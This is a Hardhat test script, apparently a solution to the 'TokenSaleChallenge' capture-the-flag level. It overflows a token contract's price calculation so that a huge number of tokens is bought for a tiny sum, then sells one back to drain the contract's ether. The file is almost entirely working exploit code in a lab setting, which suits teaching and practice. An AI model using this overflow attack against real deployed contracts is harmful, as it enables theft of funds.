import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
import { expect } from 'chai';
import { ethers } from 'hardhat';

import { TokenSaleChallenge, Attacker } from '../typechain-types';

describe('TokenSaleChallenge', () => {
  let target: TokenSaleChallenge;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = (await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: ethers.parseEther('1'),
    })) as unknown as TokenSaleChallenge;

    await target.waitForDeployment();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const numTokens = BigInt(ethers.MaxUint256) / BigInt(ethers.WeiPerEther) + BigInt(1);
    const ethToSend = ethers.formatEther(
      BigInt(numTokens) * BigInt(ethers.WeiPerEther) - (BigInt(ethers.MaxUint256) + BigInt(1))
    );

    await target.buy(numTokens, { value: ethers.parseEther(ethToSend) });
    await target.sell(1);

    expect(await target.isComplete()).to.equal(true);
  });
});
